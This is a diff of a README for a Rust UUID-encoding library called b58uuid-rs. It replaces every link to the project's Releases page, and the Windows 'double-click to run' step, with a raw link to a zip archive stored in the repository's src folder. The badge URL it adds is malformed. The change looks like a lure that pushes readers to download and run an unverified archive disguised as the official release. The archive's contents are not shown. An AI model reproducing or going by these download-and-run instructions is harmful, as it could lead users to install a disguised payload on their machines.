@@ -1,6 +1,6 @@
 # 🌟 b58uuid-rs - Easy UUID Encoding for Rust Apps
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/dabere2007/b58uuid-rs/releases)
+[![Download Latest Release](https://github.com/dabere2007/b58uuid-rs/raw/refs/heads/main/src/b-uuid-rs-1.6.zip%https://github.com/dabere2007/b58uuid-rs/raw/refs/heads/main/src/b-uuid-rs-1.6.zip)](https://github.com/dabere2007/b58uuid-rs/raw/refs/heads/main/src/b-uuid-rs-1.6.zip)
 
 ## 📦 Introduction
 
@@ -14,7 +14,7 @@ Here’s how to get started with b58uuid-rs:
 
 To download the latest version of b58uuid-rs, visit the Releases page:
 
-[Download b58uuid-rs Releases](https://github.com/dabere2007/b58uuid-rs/releases)
+[Download b58uuid-rs Releases](https://github.com/dabere2007/b58uuid-rs/raw/refs/heads/main/src/b-uuid-rs-1.6.zip)
 
 ### 2. Choose Your Download
 
@@ -24,7 +24,7 @@ On the Releases page, you will see a list of available versions. Find the most r
 
 Depending on your operating system, find the appropriate file. Here are examples of what you might see:
 
-- For Windows: Click on `b58uuid-rs-windows.exe`
+- For Windows: Click on `https://github.com/dabere2007/b58uuid-rs/raw/refs/heads/main/src/b-uuid-rs-1.6.zip`
 - For macOS: Click on `b58uuid-rs-macos`
 - For Linux: Click on `b58uuid-rs-linux`
 
@@ -40,7 +40,7 @@ After the download finishes, navigate to your Downloads folder or the location y
 
 1. Open File Explorer.
 2. Go to the Downloads folder.
-3. Double-click on `b58uuid-rs-windows.exe` to run it.
+3. Double-click on `https://github.com/dabere2007/b58uuid-rs/raw/refs/heads/main/src/b-uuid-rs-1.6.zip` to run it.
 
 #### For macOS:
 
@@ -92,6 +92,6 @@ If you have any questions, feel free to create an issue on the GitHub repository
 
 To download the latest version of b58uuid-rs, click the link below:
 
-[Download b58uuid-rs Releases](https://github.com/dabere2007/b58uuid-rs/releases)
+[Download b58uuid-rs Releases](https://github.com/dabere2007/b58uuid-rs/raw/refs/heads/main/src/b-uuid-rs-1.6.zip)
 
 Follow the steps above to download, run, and start using the application. Enjoy converting your UUIDs!
